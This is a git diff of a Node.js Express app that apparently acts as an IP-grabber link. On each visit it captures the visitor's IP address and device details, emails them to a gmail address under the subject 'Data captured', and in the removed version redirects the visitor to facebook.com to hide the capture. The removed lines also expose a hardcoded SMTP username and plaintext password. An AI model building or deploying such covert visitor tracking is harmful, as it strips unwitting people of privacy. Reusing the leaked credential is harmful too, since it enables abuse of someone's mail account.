@@ -1,3 +1,4 @@
+require('dotenv').config();
 const DeviceDetector = require('node-device-detector');
 const DeviceHelper = require('node-device-detector/helper');
 var nodemailer = require('nodemailer');
@@ -16,8 +17,8 @@ var smtpTransport = nodemailer.createTransport({
     port: 587,
     secure: false, // upgrade later with STARTTLS
     auth: {
-      user: "mark@theluckyhub.com",
-      pass: "A8wQu3{bM-]EXn`f",
+      user: process.env.SMTP_USERNAME,
+      pass: process.env.SMTP_PASSWORD,
     },
     tls: {
         ciphers:'SSLv3'
@@ -32,8 +33,8 @@ app.get("/", (req, res, next) => {
     const result = detector.detect(userAgent);
 
     var smptOptions = {
-        from: "mark@theluckyhub.com", // sender address
-        to: "promaxcoq@gmail.com", // list of receivers
+        from: process.env.SMTP_FROM, // sender address
+        to: process.env.SMTP_TO, // list of receivers
         subject: "Data captured", // Subject line
         text: "IP is... " + req.ip + JSON.stringify(result)
         // html: "<b>Hello world ✔</b>" // html body
@@ -49,11 +50,13 @@ app.get("/", (req, res, next) => {
         }
       });
 
+      /*
       res.writeHead(301, {
         Location: `https://facebook.com`
       }).end();
-      
-    // res.status(200).send(result);
+      */
+
+    res.status(200).send("received");
 })
 
 var server = app.listen(port, function(){
